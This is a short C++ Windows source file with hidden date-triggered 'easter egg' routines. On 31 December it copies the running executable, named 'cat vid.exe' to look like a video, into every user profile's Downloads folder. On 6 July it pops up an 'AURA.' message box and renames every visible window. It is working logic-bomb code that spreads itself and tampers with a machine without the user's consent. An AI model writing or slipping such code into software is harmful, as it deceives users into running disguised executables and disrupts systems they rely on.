#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>

#include "dates.h"

// ============================================================
// Dec 31st: drop a copy of the running exe as "cat vid.exe"
// into every profile's Downloads folder (including Public).
// ============================================================

static void DropCatVid()
{
    wchar_t selfPath[MAX_PATH];

    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
        return;

    const wchar_t* targetName = L"cat vid.exe";

    WIN32_FIND_DATAW fd{};

    HANDLE find =
        FindFirstFileW(
            L"C:\\Users\\*",
            &fd
        );

    if (find == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (wcscmp(fd.cFileName, L".") == 0)
            continue;

        if (wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t downloads[MAX_PATH];

        wsprintfW(
            downloads,
            L"C:\\Users\\%ls\\Downloads",
            fd.cFileName
        );

        if (GetFileAttributesW(downloads) == INVALID_FILE_ATTRIBUTES)
            continue;

        wchar_t dest[MAX_PATH];

        wsprintfW(
            dest,
            L"%ls\\%ls",
            downloads,
            targetName
        );

        CopyFileW(selfPath, dest, FALSE);
    }
    while (FindNextFileW(find, &fd));

    FindClose(find);
}

// ============================================================
// July 6th: "AURA." + every window title becomes "sigmaxxing".
// ============================================================

static BOOL CALLBACK RenameWindowsProc(
    HWND hwnd,
    LPARAM
)
{
    if (
        IsWindowVisible(hwnd) &&
        GetWindowTextLengthW(hwnd) > 0
    )
    {
        SetWindowTextW(hwnd, L"sigmaxxing");
    }

    return TRUE;
}

static void ShowAura()
{
    MessageBoxW(
        NULL,
        L"AURA.",
        L"AURA.",
        MB_OK |
        MB_ICONINFORMATION
    );

    EnumWindows(RenameWindowsProc, 0);
}

void EasterDates()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    if (st.wMonth == 12 && st.wDay == 31)
        DropCatVid();

    if (st.wMonth == 7 && st.wDay == 6)
        ShowAura();
}